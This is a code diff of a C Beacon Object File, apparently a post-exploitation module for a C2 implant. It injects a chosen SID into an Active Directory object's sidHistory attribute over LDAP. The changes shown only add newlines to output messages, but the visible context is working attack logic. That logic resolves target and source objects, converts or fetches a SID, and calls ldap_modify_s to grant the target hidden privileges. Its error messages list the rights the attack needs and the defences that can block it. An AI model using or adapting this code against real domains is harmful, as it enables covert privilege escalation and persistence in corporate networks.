@@ -30,14 +30,14 @@ BERVAL* GetObjectSid(LDAP* ld, const char* objectDN) {
     );
 
     if (result != LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query object for SID");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query object for SID\n");
         PrintLdapError("Query objectSid", result);
         return NULL;
     }
 
     LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, searchResult);
     if (!entry) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] No entry found");
+        BeaconPrintf(CALLBACK_ERROR, "[-] No entry found\n");
         WLDAP32$ldap_msgfree(searchResult);
         return NULL;
     }
@@ -45,7 +45,7 @@ BERVAL* GetObjectSid(LDAP* ld, const char* objectDN) {
     // Get binary SID value
     struct berval** values = WLDAP32$ldap_get_values_len(ld, entry, "objectSid");
     if (!values || !values[0]) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve objectSid");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve objectSid\n");
         WLDAP32$ldap_msgfree(searchResult);
         return NULL;
     }
@@ -115,7 +115,7 @@ void DisplaySidHistory(LDAP* ld, const char* objectDN) {
     );
 
     if (result != LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Unable to query current SID history");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Unable to query current SID history\n");
         return;
     }
 
@@ -128,7 +128,7 @@ void DisplaySidHistory(LDAP* ld, const char* objectDN) {
     // Get sAMAccountName for display
     char** samValues = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
     if (samValues && samValues[0]) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Account: %s", samValues[0]);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Account: %s\n", samValues[0]);
         WLDAP32$ldap_value_free(samValues);
     }
 
@@ -137,7 +137,7 @@ void DisplaySidHistory(LDAP* ld, const char* objectDN) {
     if (sidValues && sidValues[0]) {
         char* sidStr = SidToString((PSID)sidValues[0]->bv_val);
         if (sidStr) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Current SID: %s", sidStr);
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Current SID: %s\n", sidStr);
             MSVCRT$free(sidStr);
         }
         WLDAP32$ldap_value_free_len(sidValues);
@@ -150,20 +150,20 @@ void DisplaySidHistory(LDAP* ld, const char* objectDN) {
         while (historyValues[count] != NULL) count++;
 
         if (count > 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Existing SID History (%d):", count);
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Existing SID History (%d):\n", count);
             for (int i = 0; i < count; i++) {
                 char* sidStr = SidToString((PSID)historyValues[i]->bv_val);
                 if (sidStr) {
-                    BeaconPrintf(CALLBACK_OUTPUT, "    [%d] %s", i + 1, sidStr);
+                    BeaconPrintf(CALLBACK_OUTPUT, "    [%d] %s\n", i + 1, sidStr);
                     MSVCRT$free(sidStr);
                 }
             }
         } else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing SID history");
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing SID history\n");
         }
         WLDAP32$ldap_value_free_len(historyValues);
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing SID history");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing SID history\n");
     }
 
     WLDAP32$ldap_msgfree(searchResult);
@@ -184,22 +184,22 @@ void go(char *args, int alen) {
     int useLdaps = BeaconDataInt(&parser);
     
     if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Target object identifier is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Target object identifier is required\n");
         return;
     }
     
     if (!sidSource || MSVCRT$strlen(sidSource) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] SID source is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] SID source is required\n");
         return;
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] SID source: %s", sidSource);
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] SID source: %s\n", sidSource);
     
     // Initialize LDAP connection
     char* dcHostname = NULL;
     LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
     if (!ld) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection\n");
         return;
     }
     
@@ -210,7 +210,7 @@ void go(char *args, int alen) {
         
         defaultNC = GetDefaultNamingContext(ld, dcHostname);
         if (!defaultNC) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context\n");
             if (dcHostname) MSVCRT$free(dcHostname);
             CleanupLDAP(ld);
             return;
@@ -230,7 +230,7 @@ void go(char *args, int alen) {
         targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
         
         if (!targetDN) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Target '%s' not found", targetIdentifier);
+            BeaconPrintf(CALLBACK_ERROR, "[!] Target '%s' not found\n", targetIdentifier);
             if (defaultNC) MSVCRT$free(defaultNC);
             CleanupLDAP(ld);
             return;
@@ -239,7 +239,7 @@ void go(char *args, int alen) {
     
     
     // Display current state
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Current target object state:");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Current target object state:\n");
     DisplaySidHistory(ld, targetDN);
     
     // Determine SID to add
@@ -252,13 +252,13 @@ void go(char *args, int alen) {
         // Convert string SID to binary
         PSID binarySid = NULL;
         if (!ADVAPI32$ConvertStringSidToSidA(sidSource, &binarySid)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse SID string");
-            BeaconPrintf(CALLBACK_ERROR, "[!] Invalid SID format: %s", sidSource);
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse SID string\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Invalid SID format: %s\n", sidSource);
             goto cleanup;
         }
         
         if (!ADVAPI32$IsValidSid(binarySid)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Invalid SID");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Invalid SID\n");
             KERNEL32$LocalFree(binarySid);
             goto cleanup;
         }
@@ -285,7 +285,7 @@ void go(char *args, int alen) {
         KERNEL32$LocalFree(binarySid);
         
         if (!sidToAdd || !sidToAdd->bv_val) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate SID buffer");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate SID buffer\n");
             goto cleanup;
         }
         
@@ -308,20 +308,20 @@ void go(char *args, int alen) {
             sourceDN = FindObjectDN(ld, sidSource, searchBase);
             
             if (!sourceDN) {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve source object");
-                BeaconPrintf(CALLBACK_ERROR, "[!] Source '%s' not found", sidSource);
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve source object\n");
+                BeaconPrintf(CALLBACK_ERROR, "[!] Source '%s' not found\n", sidSource);
                 goto cleanup;
             }
         }
         
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Source DN: %s", sourceDN);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Source DN: %s\n", sourceDN);
         
         // Get SID from source object
         sidToAdd = GetObjectSid(ld, sourceDN);
         MSVCRT$free(sourceDN);
         
         if (!sidToAdd) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve SID from source object");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve SID from source object\n");
             goto cleanup;
         }
         
@@ -331,8 +331,8 @@ void go(char *args, int alen) {
         }
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding SID to sidHistory attribute...");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding SID to sidHistory attribute...\n");
     
     // Prepare LDAP modification
     BERVAL* sid_bervals[2] = { sidToAdd, NULL };
@@ -347,41 +347,41 @@ void go(char *args, int alen) {
     ULONG result = WLDAP32$ldap_modify_s(ld, targetDN, mods);
     
     if (result == LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added SID to sidHistory!");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added SID to sidHistory!\n");
         if (sidString) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Added SID: %s", sidString);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Added SID: %s\n", sidString);
         }
         
         // Display updated state
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Updated object state:");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Updated object state:\n");
         DisplaySidHistory(ld, targetDN);
         
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add SID to sidHistory");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add SID to sidHistory\n");
         PrintLdapError("Add sidHistory", result);
-        BeaconPrintf(CALLBACK_OUTPUT, "");
+        BeaconPrintf(CALLBACK_OUTPUT, "\n");
         
         if (result == LDAP_INSUFFICIENT_RIGHTS) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Insufficient permissions");
-            BeaconPrintf(CALLBACK_ERROR, "[!] Required rights:");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - DS-Install-Replica (domain controller install rights)");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Or 'Migrate SID History' extended right");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Typically only Domain Admins or Enterprise Admins");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Insufficient permissions\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Required rights:\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - DS-Install-Replica (domain controller install rights)\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - Or 'Migrate SID History' extended right\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - Typically only Domain Admins or Enterprise Admins\n");
         } else if (result == LDAP_UNWILLING_TO_PERFORM) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Server refused to perform operation");
-            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID filtering is enabled");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Target is a protected account");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Forest functional level restrictions");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Server refused to perform operation\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID filtering is enabled\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - Target is a protected account\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - Forest functional level restrictions\n");
         } else if (result == LDAP_CONSTRAINT_VIOLATION) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Constraint violation");
-            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID already exists in sidHistory");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID is from same domain (not allowed)");
-            BeaconPrintf(CALLBACK_ERROR, "[!]   - Invalid SID format");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Constraint violation\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID already exists in sidHistory\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID is from same domain (not allowed)\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!]   - Invalid SID format\n");
         } else if (result == LDAP_OBJECT_CLASS_VIOLATION) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Target object type doesn't support sidHistory");
-            BeaconPrintf(CALLBACK_ERROR, "[!] sidHistory is only valid on user and computer objects");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Target object type doesn't support sidHistory\n");
+            BeaconPrintf(CALLBACK_ERROR, "[!] sidHistory is only valid on user and computer objects\n");
         }
     }
     
